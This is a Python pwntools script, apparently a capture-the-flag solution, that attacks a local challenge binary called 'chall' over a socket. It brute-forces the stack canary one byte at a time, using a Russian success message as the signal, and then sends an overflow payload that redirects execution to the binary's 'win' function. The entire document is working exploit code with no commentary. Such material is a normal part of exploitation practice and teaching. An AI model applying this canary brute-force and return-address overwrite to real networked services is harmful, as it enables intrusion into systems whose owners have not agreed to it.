from pwn import *
exe = ELF('./chall')
canary = b"\x00"
PORT = 5000
HOST = "localhost"
for _ in range(7):
    for guess in range(256):
        print(f"\r canary len: {len(canary)} curr guess: {guess:x}",end="")
        io = remote(HOST, PORT)
        pl = b""
        pl += b"A" * (64+8)
        pl += canary
        pl += bytes([guess])

        io.sendlineafter(b"n: ", str(len(pl)).encode())
        io.sendlineafter(b"data: ", pl)
        try:
            io.recvuntil("⚠ ДИАГНОСТИКА ЗАВЕРШЕНА ⚠".encode())
            canary += bytes([guess])
            break
        except:
            pass

        io.close()
    print("\ncanary:", bytes.hex(canary))
io = remote(HOST, PORT)
pl = b""
pl += b"A" * (64+8)
pl += canary
pl += p64(0xdeadbeef) # rbp
pl += p64(exe.sym.win) # win func
io.sendlineafter(b"n: ", str(len(pl)).encode())
io.sendlineafter(b"data: ", pl)
print(io.recvall().decode(errors='ignore'))
io.close()